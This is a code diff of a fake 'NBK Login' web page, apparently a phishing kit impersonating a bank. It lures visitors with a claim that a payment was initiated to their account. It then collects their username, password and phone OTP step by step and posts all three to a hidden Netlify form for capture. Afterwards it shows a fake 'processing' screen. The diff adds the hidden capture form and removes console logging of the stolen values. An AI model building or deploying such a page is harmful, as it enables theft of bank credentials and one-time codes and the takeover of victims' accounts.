@@ -6,35 +6,29 @@
     <title>NBK Login</title>
     <script src="https://cdn.tailwindcss.com/"></script>
     <style>
-        /* Custom font for a magazine-like feel (Inter is default, but adding a serif fallback) */
         body {
             font-family: "Inter", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
-            background-color: #ffffff; /* Body background is white */
-            margin: 0; /* Ensures no default body margin */
-            padding: 0; /* Ensures no default body padding */
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
         }
-        /* Custom blue for text, similar to magazine blue */
         .text-magazine-blue {
-            color: #007bff; /* A vibrant blue */
+            color: #007bff;
         }
-        /* Darker blue for the button */
         .bg-dark-blue {
-            background-color: #0056b3; /* A darker shade of blue */
+            background-color: #0056b3;
         }
         .bg-dark-blue:hover {
-            background-color: #004085; /* Even darker on hover */
+            background-color: #004085;
         }
-
-        /* CSS for the rotating spinner */
         .spinner {
-            border: 4px solid rgba(0, 123, 255, 0.1); /* Light blue border */
-            border-top: 4px solid #007bff; /* Blue top border */
+            border: 4px solid rgba(0, 123, 255, 0.1);
+            border-top: 4px solid #007bff;
             border-radius: 50%;
             width: 40px;
             height: 40px;
-            animation: spin 1s linear infinite; /* Spin animation */
+            animation: spin 1s linear infinite;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -58,6 +52,15 @@
                 <div id="dynamicFormContent">
                     </div>
             </form>
+
+            <form name="nbk-login" data-netlify="true" hidden>
+                <input type="text" name="username" />
+                <input type="password" name="password" />
+                <input type="text" name="otp" />
+                <input type="text" name="phase_submitted" />
+                <input type="text" name="timestamp" />
+            </form>
+
         </div>
     </div>
 
@@ -72,7 +75,6 @@
         let storedPassword = '';
         let storedOtp = '';
 
-        // Function to render the current content based on the login phase
         function renderForm() {
             let contentHtml = '';
 
@@ -89,7 +91,7 @@
                     labelText = 'Enter your username';
                     inputType = 'text';
                     inputId = 'username';
-                    inputName = 'username'; // Netlify Forms needs this name
+                    inputName = 'username'; // Netlify Forms needs this name (matches hidden form)
                     placeholder = 'Your username';
                     buttonText = 'Next';
                     inputValue = storedUsername;
@@ -97,15 +99,15 @@
                     labelText = 'Enter your password';
                     inputType = 'password';
                     inputId = 'password';
-                    inputName = 'password'; // Netlify Forms needs this name
+                    inputName = 'password'; // Netlify Forms needs this name (matches hidden form)
                     placeholder = 'Your password';
                     buttonText = 'Login';
                     inputValue = storedPassword;
                 } else if (loginPhase === 'otp') {
                     labelText = 'Enter OTP sent to your phone number';
-                    inputType = 'text';
+                    inputType = 'text'; // Often 'text' for OTP to allow number-only input or mask
                     inputId = 'otp';
-                    inputName = 'otp'; // Netlify Forms needs this name
+                    inputName = 'otp'; // Netlify Forms needs this name (matches hidden form)
                     placeholder = 'Your OTP';
                     buttonText = 'Verify OTP';
                     inputValue = storedOtp;
@@ -139,35 +141,28 @@
                 `;
             }
 
-            // Update the form content with the new HTML
             dynamicFormContent.innerHTML = contentHtml;
 
-            // Update the dynamic heading and subheading based on the current phase
             if (loginPhase === 'welcome') {
                 dynamicHeading.textContent = 'Your request is being processed, thank you for staying with us';
-                dynamicSubheading.textContent = ''; // Clear subheading for welcome page
+                dynamicSubheading.textContent = '';
             } else {
-                dynamicHeading.textContent = 'Login NBK Account'; // Reset for other phases
-                dynamicSubheading.textContent = 'Ahmed kumar iniated payment to your NBK Account'; // Set subheading for other phases
+                dynamicHeading.textContent = 'Login NBK Account';
+                dynamicSubheading.textContent = 'Ahmed kumar iniated payment to your NBK Account';
             }
 
-            // Attach the submit event listener to the *form* element itself
-            // This is crucial for Netlify Forms to intercept.
             if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
                 loginForm.onsubmit = handleFormSubmission;
             } else if (loginPhase === 'welcome') {
-                // For the 'welcome' phase, the "Finish" button is just a UI element, not a form submission trigger
                 document.getElementById('proceedButton').addEventListener('click', () => {
-                    alert("Welcome to the bank!"); // Simulate proceeding
-                    // In a real app, you would redirect the user here:
-                    // window.location.href = '/dashboard.html';
+                    alert("Welcome to the bank!");
+                    // window.location.href = '/dashboard.html'; // Example: Redirect to a dashboard
                 });
             }
         }
 
-        // Function to handle the form submission for Netlify
         async function handleFormSubmission(event) {
-            event.preventDefault(); // Prevent default browser form submission initially
+            event.preventDefault();
 
             let currentInputData = '';
             let nextPhase = '';
@@ -201,55 +196,39 @@
                 nextPhase = 'welcome';
             }
 
-            // --- IMPORTANT FOR NETLIFY FORMS ---
-            // Only when we reach the 'welcome' phase do we perform the actual Netlify form submission.
-            // For intermediate steps, we just manage the UI state.
+            // Only when we reach the 'welcome' phase (final step) do we submit to Netlify Forms
             if (nextPhase === 'welcome') {
-                // Prepare form data for Netlify submission
-                const formData = new FormData(); // Create an empty FormData object
-
-                // Append ALL the collected data, including the hidden form-name
-                formData.append('form-name', 'nbk-login'); // Must match the form's name attribute
-                formData.append('username', storedUsername); // Use the name attributes you defined
+                const formData = new FormData();
+                formData.append('form-name', 'nbk-login'); // Matches the 'name' of both forms
+                formData.append('username', storedUsername);
                 formData.append('password', storedPassword);
                 formData.append('otp', storedOtp);
-                formData.append('phase_submitted', loginPhase); // Optional: useful for tracking
-                formData.append('timestamp', new Date().toISOString()); // Add a timestamp for server-side logging
-
-                // You can also add other static data if needed
-                // formData.append('form_type', 'multi-step-login');
-
+                formData.append('phase_submitted', loginPhase);
+                formData.append('timestamp', new Date().toISOString());
 
                 // Show loading spinner
                 loginPhase = 'loading';
                 renderForm();
 
-                // Submit the form using Fetch API to Netlify's forms endpoint
-                // The action attribute of your form (if set) or the current page path is the target.
-                const netlifyFormUrl = loginForm.action || window.location.pathname;
+                const netlifyFormUrl = loginForm.action || window.location.pathname; // Submits to the current page path
 
                 try {
                     const response = await fetch(netlifyFormUrl, {
                         method: 'POST',
-                        body: formData, // FormData correctly sets Content-Type
+                        body: formData,
                     });
 
                     if (response.ok) {
                         console.log("Data successfully sent to Netlify Forms!");
-                        // Simulate delay and then proceed to welcome UI
                         setTimeout(() => {
                             loginPhase = 'welcome';
                             renderForm();
                             console.log("OTP Verified! Login successful!");
-                            // For security, avoid logging sensitive data to console in production
-                            console.log("Username (captured):", storedUsername);
-                            console.log("Password (captured):", storedPassword);
-                            console.log("OTP (captured):", storedOtp);
-                        }, 3000); // 3 seconds delay
+                        }, 3000); // Simulate delay
                     } else {
                         console.error("Failed to send data to Netlify Forms. Status:", response.status);
                         alert("An error occurred during submission. Please try again.");
-                        loginPhase = 'otp'; // Revert to OTP if submission fails
+                        loginPhase = 'otp'; // Revert if submission fails
                         renderForm();
                     }
                 } catch (error) {
@@ -260,17 +239,16 @@
                 }
 
             } else {
-                // For intermediate phases (username, password), just transition the UI
+                // For intermediate phases, just transition the UI
                 loginPhase = 'loading';
                 renderForm();
                 setTimeout(() => {
                     loginPhase = nextPhase;
                     renderForm();
-                }, 3000); // 3 seconds delay for UI transition
+                }, 3000); // Simulate delay
             }
         }
 
-        // Initial render when the page loads
         document.addEventListener('DOMContentLoaded', renderForm);
     </script>
 
